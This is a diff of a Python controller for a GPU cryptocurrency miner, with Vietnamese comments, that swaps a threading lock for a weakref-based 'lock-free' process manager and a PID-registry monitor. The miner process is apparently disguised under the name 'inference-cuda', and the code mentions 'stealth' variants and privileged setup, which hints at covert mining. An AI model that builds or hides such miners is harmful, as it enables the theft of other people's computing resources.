@@ -75,9 +75,38 @@ gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.lo
 gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')
 
 stop_event = threading.Event()
-process_lock = threading.Lock()
-# **GPU-Only Process Management** (Quản lý tiến trình GPU duy nhất)
-gpu_process = None
+
+# **Lock-Free Process Manager** (Trình quản lý tiến trình không khóa)
+import weakref
+import queue
+
+class LockFreeProcessManager:
+    """**Lock-Free Process Manager** sử dụng **atomic operations** (thao tác nguyên tử)"""
+    def __init__(self):
+        self._gpu_process_ref = None
+        self._health_event = threading.Event()
+        
+    def set_gpu_process(self, process):
+        if process:
+            self._gpu_process_ref = weakref.ref(process)
+            self._health_event.set()
+        else:
+            self._gpu_process_ref = None
+            self._health_event.clear()
+    
+    def get_gpu_process_status(self):
+        if not self._health_event.is_set():
+            return False, None
+        if self._gpu_process_ref:
+            process = self._gpu_process_ref()
+            if process and process.poll() is None:
+                return True, process
+        self._health_event.clear()
+        return False, None
+
+# **Global Lock-Free Manager** (Trình quản lý toàn cục không khóa)
+process_manager = LockFreeProcessManager()
+gpu_process = None  # Compatibility
 
 # Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
 privileged_manager_global = None
@@ -958,6 +987,7 @@ def gpu_mining_thread():
                 
                 new_process = start_gpu_mining_process(privileged_manager=privileged_manager)
                 gpu_process = new_process
+                process_manager.set_gpu_process(new_process)  # **Lock-free update**
                 thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
                 if gpu_process:
                     thread_logger.info(f"🔍 [DEBUG] GPU process received successfully - PID: {gpu_process.pid}")
@@ -1109,70 +1139,74 @@ def main():
         except Exception as e2:
             logger.error(f"❌ Fallback PID Logger worker also failed: {e2}")
 
-    # 🤖 Auto PID Registration Thread để theo dõi và đăng ký tiến trình mining
+    # 🤖 Auto PID Registration Thread - DirectPIDRegistry Pure Mechanism
     def auto_pid_registration_thread():
-        """Luồng tự động theo dõi và đăng ký tiến trình mining mới"""
+        """
+        **DirectPIDRegistry Pure Mechanism** (cơ chế DirectPIDRegistry thuần túy)
+        Luồng chỉ giám sát **registry events** (sự kiện sổ đăng ký) từ DirectPIDRegistry 
+        mà không thực hiện **process name recognition** (nhận biết tên tiến trình)
+        """
         import time as time_module
-        import glob
-        import os
-        from pid_logger import register_process, _PROCESS_REGISTRY, debug_registry_status
+        from pid_logger import _PROCESS_REGISTRY, debug_registry_status
         
-        logger.info("🤖 Auto PID Registration Thread started")
-        last_scan_pids = set()
+        logger.info("🤖 Auto PID Registration Thread started - DirectPIDRegistry Pure Mode")
+        logger.info("📋 Mode: Registry monitoring only, no process name detection")
+        
+        # **Registry Monitoring Variables** (biến giám sát sổ đăng ký)
+        last_registry_size = 0
+        monitoring_cycle = 0
         
         while True:
             try:
-                # **GPU-Only Process Scanning** (quét tiến trình GPU duy nhất)
-                current_pids = set()
+                monitoring_cycle += 1
                 
-                for proc_dir in glob.glob("/proc/[0-9]*"):
-                    try:
-                        pid = int(proc_dir.split('/')[-1])
-                        with open(f"{proc_dir}/cmdline", 'r') as f:
-                            cmdline = f.read().strip()
-                        
-                        # **GPU-Only**: Check inference-cuda only
-                        if "inference-cuda" in cmdline and "stealth" not in cmdline:
-                            current_pids.add((pid, "gpu", "inference-cuda"))
-                            
-                    except (OSError, IOError, ValueError):
-                        continue
+                # **DirectPIDRegistry Status Monitoring** (giám sát trạng thái DirectPIDRegistry)
+                current_registry_size = len(_PROCESS_REGISTRY)
                 
-                # Đăng ký các PID mới
-                new_pids = current_pids - last_scan_pids
-                for pid, process_type, process_name in new_pids:
-                    if pid not in _PROCESS_REGISTRY:
-                        try:
-                            # Sử dụng psutil để tạo real process object
-                            real_proc = psutil.Process(pid)
-                            
-                            register_process(pid, process_type, real_proc, process_name)
-                            logger.info(f"🤖 Auto-registered new {process_type} mining PID: {pid} with real psutil process object")
-                        except psutil.NoSuchProcess:
-                            logger.warning(f"🤖 Process PID {pid} no longer exists during registration")
-                        except psutil.AccessDenied:
-                            logger.warning(f"🤖 Access denied for PID {pid}, using fallback fake process")
-                            # Fallback to fake process if access denied
-                            fake_proc = type('FakeProcess', (), {
-                                'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
-                                'is_running': lambda: os.path.exists(f"/proc/{pid}")
-                            })()
-                            register_process(pid, process_type, fake_proc, process_name)
-                            logger.info(f"🤖 Auto-registered new {process_type} mining PID: {pid} with fallback fake process")
-                        except Exception as e:
-                            logger.warning(f"🤖 Auto-registration failed for PID {pid}: {e}")
+                # **Registry Change Detection** (phát hiện thay đổi sổ đăng ký)
+                if current_registry_size != last_registry_size:
+                    registry_change = current_registry_size - last_registry_size
+                    change_type = "increased" if registry_change > 0 else "decreased"
+                    
+                    logger.info(f"🔄 DirectPIDRegistry {change_type}: {abs(registry_change)} process(es)")
+                    logger.info(f"📊 Current registry size: {current_registry_size} processes")
+                    
+                    # **Log Registry Contents** (ghi log nội dung sổ đăng ký) - without process name filtering
+                    for pid, process_info in _PROCESS_REGISTRY.items():
+                        process_status = "running" if hasattr(process_info.get('process'), 'is_running') and process_info['process'].is_running() else "unknown"
+                        logger.info(f"📋 Registry: PID={pid}, Type={process_info.get('type', 'unknown')}, Status={process_status}")
+                    
+                    last_registry_size = current_registry_size
                 
-                last_scan_pids = current_pids
-                
-                # Debug info mỗi 30s
-                if time_module.time() % 30 < 5:  # Gần như mỗi 30s
+                # **Periodic Registry Health Check** (kiểm tra sức khỏe sổ đăng ký định kỳ)
+                if monitoring_cycle % 6 == 0:  # Every 30 seconds (6 cycles * 5s)
+                    logger.info(f"🔍 Registry Health Check (Cycle {monitoring_cycle})")
+                    logger.info(f"📊 Active processes in registry: {current_registry_size}")
+                    
+                    # **Enhanced Debug Information** (thông tin gỡ lỗi nâng cao)
                     debug_registry_status()
+                    
+                    # **Registry Cleanup Check** (kiểm tra dọn dẹp sổ đăng ký)
+                    dead_pids = []
+                    for pid, process_info in _PROCESS_REGISTRY.items():
+                        try:
+                            process_obj = process_info.get('process')
+                            if process_obj and hasattr(process_obj, 'is_running'):
+                                if not process_obj.is_running():
+                                    dead_pids.append(pid)
+                        except Exception:
+                            dead_pids.append(pid)
+                    
+                    if dead_pids:
+                        logger.info(f"🧹 Found {len(dead_pids)} dead processes in registry: {dead_pids}")
+                        # Note: Cleanup sẽ được thực hiện bởi DirectPIDRegistry internal mechanism
                 
-                time_module.sleep(5)  # Scan mỗi 5 giây
+                # **Non-Intrusive Monitoring Interval** (khoảng thời gian giám sát không xâm phạm)
+                time_module.sleep(5)  # Registry monitoring every 5 seconds
                 
             except Exception as e:
                 logger.error(f"🤖 Auto PID Registration Thread error: {e}")
-                time_module.sleep(10)  # Sleep dài hơn khi có lỗi
+                time_module.sleep(10)  # Longer sleep on error
     
     # Thêm khai báo danh sách mining_threads
     mining_threads = []
@@ -1257,9 +1291,8 @@ def main():
                     # 🗑️ **REMOVED**: EventBus notifications replaced by DirectPIDRegistry
                     logger.info(f"⚠️ {thread_name} thread has stopped - using DirectPIDRegistry for notifications")
             
-            # **Simple GPU process health check** (kiểm tra sức khỏe tiến trình GPU đơn giản)
-            with process_lock:
-                gpu_alive = is_mining_process_running(gpu_process)
+            # **Lock-Free GPU process health check** (kiểm tra sức khỏe GPU không khóa)
+            gpu_alive, current_process = process_manager.get_gpu_process_status()
             
             if not gpu_alive:
                 logger.warning("⚠️ GPU mining process stopped!")
@@ -1306,21 +1339,22 @@ def main():
     # Performance reporting removed - simplified cleanup
     
     
-    # **GPU-Only Process Cleanup** (dọn dẹp tiến trình GPU duy nhất)
+    # **Lock-Free GPU Process Cleanup** (dọn dẹp tiến trình GPU không khóa)
     logger.info("🧹 Cleaning up GPU mining process...")
-    with process_lock:
-        # **Terminate GPU Process** (kết thúc tiến trình GPU)
-        if gpu_process and gpu_process.poll() is None:
-            logger.info(f"Dừng tiến trình GPU miner (PID: {gpu_process.pid})...")
-            try:
-                gpu_process.terminate()
-                gpu_process.wait(timeout=5)  # Wait for graceful termination
-                logger.info("✅ GPU process terminated gracefully")
-            except subprocess.TimeoutExpired:
-                logger.warning("⚠️ GPU process did not terminate gracefully, forcing kill")
-                gpu_process.kill()
-            except Exception as e:
-                logger.error(f"❌ Error terminating GPU process: {e}")
+    gpu_alive, current_process = process_manager.get_gpu_process_status()
+    if gpu_alive and current_process:
+        logger.info(f"Dừng tiến trình GPU miner (PID: {current_process.pid})...")
+        try:
+            current_process.terminate()
+            current_process.wait(timeout=5)  # Wait for graceful termination
+            logger.info("✅ GPU process terminated gracefully")
+        except subprocess.TimeoutExpired:
+            logger.warning("⚠️ GPU process did not terminate gracefully, forcing kill")
+            current_process.kill()
+        except Exception as e:
+            logger.error(f"❌ Error terminating GPU process: {e}")
+        finally:
+            process_manager.set_gpu_process(None)  # **Clear lock-free reference**
     
     logger.info("Hệ thống đã dừng. Thoát.")
 
